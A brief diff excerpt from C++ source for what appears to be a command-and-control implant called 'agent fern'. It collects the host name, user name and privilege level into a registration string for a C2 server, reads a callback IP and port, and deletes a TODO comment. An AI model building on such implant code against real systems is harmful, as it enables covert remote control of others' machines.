@@ -40,8 +40,6 @@ int main() {
     agent fern;
     //register string, send to tell us that the agent is alive and working
     std::string reg {std::format("{},,{},,{}",fern.getHostname(), fern.getUsername(), fern.getPrivilege())};
-    //TODO remove these later, commands should be taken from the C2 server
-
 
     std::string ip{fern.getip()};
     unsigned int port{fern.getport()};
